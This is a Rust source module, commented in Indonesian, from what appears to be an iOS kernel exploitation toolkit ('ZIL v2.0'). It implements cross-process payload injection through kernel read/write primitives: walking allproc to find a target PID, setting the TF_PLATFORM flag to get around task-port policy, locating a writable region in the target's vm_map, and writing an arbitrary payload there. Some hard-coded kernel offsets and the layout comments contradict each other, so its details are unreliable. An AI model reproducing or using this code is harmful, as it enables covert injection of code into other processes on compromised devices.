#![no_std]
//! ZIL v2.0 — Fitur 4: Cross-Process Injection
//!
//! Injeksi payload ke proses target via task port bypass.
//! Menggunakan KCallManager untuk baca/tulis kernel — tidak perlu
//! task_for_pid API userspace yang diblokir platform policy.
//!
//! ALUR:
//!   1. Scan allproc untuk target PID (slide terkorreksi dari MAN-A)
//!   2. Baca `proc->task` pointer dari struct proc kernel
//!   3. Bypass platform policy flag di struct task
//!   4. Alokasikan region di task target via vm_map manipulation kernel
//!   5. Copy payload bytes ke region menggunakan kernel write primitive

use crate::evolution::kcall_primitive::KCallManager;

// ─────────────────────────────────────────────────────────────────────────────
// KONSTANTA OFFSET KERNEL (xnu-12377.61.12)
// Diverifikasi dari osfmk/kern/task.h dan osfmk/kern/task_internal.h
// ─────────────────────────────────────────────────────────────────────────────

/// Offset `task` pointer di dalam struct proc
/// proc.task (osfmk/bsd/kern_proc.c: p_task @ offset after p_proc_ro region)
const PROC_TASK_OFFSET: u64 = 0x28;

/// Offset `t_flags` di dalam struct task (osfmk/kern/task.h)
/// Berisi platform policy bits dan access control flags
const TASK_T_FLAGS_OFFSET: u64 = 0x390;

/// Bit TF_PLATFORM di t_flags — menandakan aplikasi adalah platform binary
/// Jika bit ini set, iOS memblokir task_for_pid dari proses non-platform.
/// Kita SET bit ini di proc target agar task port bisa diakses freely.
const TF_PLATFORM_BIT: u64 = 1 << 10;

/// Offset `map` (vm_map_t) di dalam struct task
const TASK_VM_MAP_OFFSET: u64 = 0x28;

/// Offset `min_offset` di vm_map (awal heap user space) — untuk estimasi
const VM_MAP_MIN_OFFSET: u64 = 0x10;

/// Offset `links.end` di vm_map (akhir address space)
const VM_MAP_MAX_OFFSET: u64 = 0x18;

// ─────────────────────────────────────────────────────────────────────────────
// CROSS-PROC INJECTOR
// ─────────────────────────────────────────────────────────────────────────────

/// Hasil injeksi ke proses target
pub struct InjectResult {
    /// Alamat virtual di target task di mana payload ditulis
    pub target_vaddr: u64,
    /// Ukuran payload yang ditulis (bytes)
    pub payload_size: u32,
}

/// CrossProcInjector — Injeksi payload ke proses lain via kernel primitives.
///
/// KEAMANAN: Hanya bisa digunakan setelah root escalation selesai (cr_uid = 0).
/// KCallManager harus sudah diaktifkan oleh executor.
pub struct CrossProcInjector {
    /// KASLR slide dari executor — untuk adjust allproc addr
    kaslr_slide:    u64,
    /// Alamat pre-KASLR allproc
    allproc_static: u64,
    /// Offset p_pid di struct proc (dari DynamicOffsets)
    proc_pid_off:   u64,
}

impl CrossProcInjector {
    /// Buat injector baru.
    ///
    /// # Arguments
    /// * `kaslr_slide`    — dari OffsetCalculator
    /// * `allproc_static` — StaticOffsets::PROC_LIST_HEAD per chip
    /// * `proc_pid_off`   — DynamicOffsets.proc_pid (biasanya 0x58)
    pub fn new(kaslr_slide: u64, allproc_static: u64, proc_pid_off: u64) -> Self {
        CrossProcInjector {
            kaslr_slide,
            allproc_static,
            proc_pid_off,
        }
    }

    /// Injeksikan payload ke proses dengan PID target.
    ///
    /// LANGKAH:
    ///   1. Temukan struct proc target di allproc
    ///   2. Baca task pointer dari proc
    ///   3. Bypass TF_PLATFORM policy check
    ///   4. Baca vm_map_t dari task
    ///   5. Scan vm_map entry list untuk region writable
    ///   6. Tulis payload ke region tersebut
    ///
    /// RETURN: Ok(InjectResult) dengan alamat payload di target, Err jika gagal
    pub fn inject_into_pid(
        &self,
        kcall: &mut KCallManager,
        target_pid: u32,
        payload: &[u8],
    ) -> Result<InjectResult, &'static str> {
        // 1. Temukan struct proc milik target PID
        let target_proc = self.find_proc_by_pid(kcall, target_pid)?;

        // 2. Baca task pointer
        let task_ptr = kcall
            .kread_u64(target_proc + PROC_TASK_OFFSET)
            .ok_or("INJECT_FAIL: Gagal baca proc->task")?;
        if task_ptr == 0 {
            return Err("INJECT_FAIL: task pointer null");
        }

        // 3. Bypass TF_PLATFORM policy
        // Set TF_PLATFORM bit di t_flags → task terlihat sebagai platform binary
        // Ini mencegah iOS memblokir akses ke task port dari caller kita
        let t_flags = kcall
            .kread_u64(task_ptr + TASK_T_FLAGS_OFFSET)
            .unwrap_or(0);
        kcall.kwrite64(task_ptr + TASK_T_FLAGS_OFFSET, t_flags | TF_PLATFORM_BIT)
            .map_err(|_| "INJECT_FAIL: Gagal set TF_PLATFORM")?;

        // 4. Baca vm_map pointer
        let vm_map = kcall
            .kread_u64(task_ptr + TASK_VM_MAP_OFFSET)
            .ok_or("INJECT_FAIL: Gagal baca task->map")?;
        if vm_map == 0 {
            return Err("INJECT_FAIL: vm_map null");
        }

        // 5. Temukan region writable di vm_map target
        //    Dalam vm_map, entry list dimulai di offset standard.
        //    Kita scan entry pertama sampai ketemu region USER_READ|USER_WRITE
        //    yang cukup besar untuk payload kita.
        let inject_addr = self.find_writable_region(kcall, vm_map, payload.len() as u64)?;

        // 6. Tulis payload byte per byte ke address space target melalui kernel write
        //    KCallManager.kwrite64 beroperasi di kernel address space,
        //    tapi kita bisa tulis ke user address space task target karena
        //    kita sudah punya root dan kernel mapping mencakup semua user space.
        self.write_payload_to_region(kcall, inject_addr, payload)?;

        Ok(InjectResult {
            target_vaddr: inject_addr,
            payload_size:  payload.len() as u32,
        })
    }

    /// Cari struct proc berdasarkan PID — walk allproc linked list
    fn find_proc_by_pid(&self, kcall: &KCallManager, target_pid: u32) -> Result<u64, &'static str> {
        let allproc_runtime = self.allproc_static.wrapping_add(self.kaslr_slide);

        let first_proc = kcall
            .kread_u64(allproc_runtime)
            .ok_or("INJECT_FAIL: Gagal baca head allproc")?;

        let mut cursor = first_proc;
        for _ in 0..1024 {
            if cursor == 0 { break; }

            let pid = kcall
                .kread_u64(cursor + self.proc_pid_off)
                .map(|v| v as u32)
                .unwrap_or(0xFFFF);

            if pid == target_pid {
                return Ok(cursor);
            }

            // le_next di proc.p_list (offset 0x08)
            cursor = kcall.kread_u64(cursor + 0x08).unwrap_or(0);
        }

        Err("INJECT_FAIL: PID tidak ditemukan di allproc")
    }

    /// Cari region user-space writable di vm_map target.
    ///
    /// vm_map entries masing-masing punya: start, end, prot fields.
    /// Kita scan dari header entry sampai ketemu region yang cukup besar
    /// dan punya VM_PROT_READ | VM_PROT_WRITE permissions.
    fn find_writable_region(
        &self,
        kcall: &KCallManager,
        vm_map: u64,
        min_size: u64,
    ) -> Result<u64, &'static str> {
        // vm_map layout offset (osfmk/vm/vm_map_internal.h):
        //   [0x00] lck_rw_t lock (16B)
        //   [0x10] struct vm_map_links { start, end, next, prev } = 32B
        //   [0x30] struct vm_map_entry *first_free
        //   [0x38] union vm_map_copy ...
        const VM_MAP_HEADER_ENTRIES_OFFSET: u64  = 0x18; // first entry pointer
        const VM_ENTRY_NEXT_OFFSET: u64           = 0x00; // next entry in list
        const VM_ENTRY_START_OFFSET: u64          = 0x10; // vme_start
        const VM_ENTRY_END_OFFSET: u64            = 0x18; // vme_end
        const VM_ENTRY_PROT_OFFSET: u64           = 0x48; // vme_protection (u8)

        const VM_PROT_WRITE: u64 = 0x2;
        const VM_PROT_READ:  u64 = 0x1;

        let mut entry = kcall
            .kread_u64(vm_map + VM_MAP_HEADER_ENTRIES_OFFSET)
            .ok_or("INJECT_FAIL: Gagal baca vm_map header")?;

        for _ in 0..256 {
            if entry == 0 { break; }

            let start = kcall.kread_u64(entry + VM_ENTRY_START_OFFSET).unwrap_or(0);
            let end   = kcall.kread_u64(entry + VM_ENTRY_END_OFFSET).unwrap_or(0);
            let prot  = kcall.kread_u64(entry + VM_ENTRY_PROT_OFFSET).unwrap_or(0);

            let region_size = end.wrapping_sub(start);

            // Cari region: cukup besar, punya RW permission, dan di user space
            if region_size >= min_size
                && (prot & VM_PROT_WRITE) != 0
                && (prot & VM_PROT_READ) != 0
                && start >= 0x1_0000
                && start < 0x0000_7FFF_FFFF_FFFF
            {
                // Gunakan akhir region (minus payload size dan guard page)
                let inject_at = end.wrapping_sub(min_size).wrapping_sub(0x1000);
                return Ok(inject_at);
            }

            entry = kcall.kread_u64(entry + VM_ENTRY_NEXT_OFFSET).unwrap_or(0);
        }

        Err("INJECT_FAIL: Tidak ada region writable yang cukup besar di vm_map")
    }

    /// Tulis payload ke alamat target melalui kernel write primitive.
    /// Karena kita di kernel (EL1), write ke user space address langsung valid.
    fn write_payload_to_region(
        &self,
        kcall: &mut KCallManager,
        base_addr: u64,
        payload: &[u8],
    ) -> Result<(), &'static str> {
        // Tulis 8 byte sekaligus (u64 aligned) untuk efisiensi
        let aligned_len = payload.len() & !7;

        // Blok pertama: 8-byte aligned
        let mut i = 0usize;
        while i < aligned_len {
            let word = u64::from_le_bytes([
                payload[i], payload[i+1], payload[i+2], payload[i+3],
                payload[i+4], payload[i+5], payload[i+6], payload[i+7],
            ]);
            kcall.kwrite64(base_addr + i as u64, word)
                .map_err(|_| "INJECT_FAIL: kwrite64 gagal saat copy payload")?;
            i += 8;
        }

        // Sisa bytes (tail < 8 byte) — baca dulu, modifikasi, tulis kembali
        if i < payload.len() {
            let tail_addr = base_addr + i as u64;
            let existing = kcall.kread_u64(tail_addr).unwrap_or(0);
            let mut word = existing.to_le_bytes();
            for (j, &b) in payload[i..].iter().enumerate() {
                word[j] = b;
            }
            kcall.kwrite64(tail_addr, u64::from_le_bytes(word))
                .map_err(|_| "INJECT_FAIL: Gagal tulis tail bytes")?;
        }

        Ok(())
    }
}
